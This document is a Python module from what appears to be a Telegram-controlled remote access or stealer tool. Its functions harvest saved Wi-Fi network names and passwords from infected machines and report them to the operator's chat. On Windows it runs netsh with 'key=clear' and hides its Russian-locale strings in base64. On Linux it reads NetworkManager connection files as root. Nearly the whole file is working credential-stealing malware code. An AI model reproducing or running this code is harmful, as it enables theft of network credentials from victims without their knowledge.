from modules import Command
import ctypes
import locale
import config
import constants
import os
import base64
from utils import getarg, getMarkupModes, validate_time_argument, create_menu_markup, send_message


async def stealer_callback(bot, call):
    markup = getMarkupModes()

    is_successfull, stealed_wifi = steal_wifi()

    if not is_successfull:
        await send_message(bot, call.message.chat.id, text=stealed_wifi, reply_markup=markup)
        return

    answer = constants.wifistealer_answer_message
    for wifi, password in stealed_wifi.items():
        answer += wifi + ' ' * \
            (30 - ((len(wifi) - 4) * (len(wifi) > 4))) + password + '\n'

    await send_message(bot, call.message.chat.id, text=answer, reply_markup=markup)


async def showwifi_callback(bot, call):
    markup = getMarkupModes()

    WIFI_list = get_list_of_wifi()

    await send_message(bot, call.message.chat.id, text=WIFI_list, reply_markup=markup)


def steal_wifi():
    if config.os_name == constants.Windows_OS:
        stolen_passwords = steal_wifi_windows()
    if config.os_name == constants.Linux_OS:
        stolen_passwords = steal_wifi_linux()
    if stolen_passwords == None:
        return "Seems like device haven't wlan."
    return stolen_passwords


def steal_wifi_linux():
    try:
        if not config.is_root:
            return (0, constants.TO_USE_MUST_BE_ROOT)

        networks_path = '/etc/NetworkManager/system-connections/'
        networks = os.listdir(networks_path)

        datas = dict()
        for network in networks:
            with open(networks_path + network, encoding='cp866') as file:
                data = file.readlines()

            ssid, psk = 'No', 'No'
            for line in data:
                if 'ssid=' in line:
                    ssid = line.replace('ssid=', '')
                if 'psk=' in line:
                    psk = line.replace('psk=', '')
            datas[ssid.strip()] = psk

        return (1, datas)

    except Exception as ex:
        return (0, 'Error: ' + str(ex))


def steal_wifi_windows():
    try:
        data = Command.run_command(
            f'netsh wlan show profiles').split('\n')

        windll = ctypes.windll.kernel32
        windll.GetUserDefaultUILanguage()

        languege = locale.windows_locale[windll.GetUserDefaultUILanguage()]
        england = {'User_profiles': 'All User Profile',
                   'key_content': 'Key Content'}
        rusland = {'User_profiles': base64.b64decode('0JLRgdC1INC/0YDQvtGE0LjQu9C4INC/0L7Qu9GM0LfQvtCy0LDRgtC10LvQtdC5'.encode('utf-8')).decode('utf-8'),
                   'key_content': base64.b64decode('0KHQvtC00LXRgNC20LjQvNC+0LUg0LrQu9GO0YfQsA=='.encode('utf-8')).decode('utf-8')}

        if languege == 'ru_RU':
            wifi_lang = rusland
        elif languege == 'en_US':
            wifi_lang = england
        else:
            wifi_lang = england

        wifis = [line.split(':')[1][1:]
                 for line in data if wifi_lang['User_profiles'] in line]

        datas = {}
        for wifi in wifis:
            results = Command.run_command(
                f'netsh wlan show profile "{wifi}" key=clear').split('\n')

            results = [line.split(':')[1][1:]
                       for line in results if wifi_lang['key_content'] in line]

            try:
                datas[wifi] = results[0]

            except:
                datas[wifi] = "Not found"

        if len(datas) == 0:
            return (0, "Not found")

        return (1, datas)

    except Exception as ex:
        return (0, 'Error: ' + str(ex))


def get_list_of_wifi():
    if config.os_name == constants.Windows_OS:
        list_of_wifi = get_list_of_wifi_windows()
    if config.os_name == constants.Linux_OS:
        list_of_wifi = get_list_of_wifi_linux()
    if list_of_wifi == None or list_of_wifi == '':
        return "Seems like device haven't wlan."
    return list_of_wifi


def get_list_of_wifi_linux():
    try:
        networks = Command.run_command(
            'nmcli device wifi list')

        decoded_networks = networks
    except Exception as ex:
        return ex

    return decoded_networks


def get_list_of_wifi_windows():
    try:
        networks = Command.run_command(
            'netsh wlan show networks')

    except Exception as ex:
        return ex

    return networks


modes = {constants.WIFI_STEALER_preview: constants.WIFI_STEALER,
         constants.WIFI_SHOWWIFI_preview: constants.WIFI_SHOWWIFI}
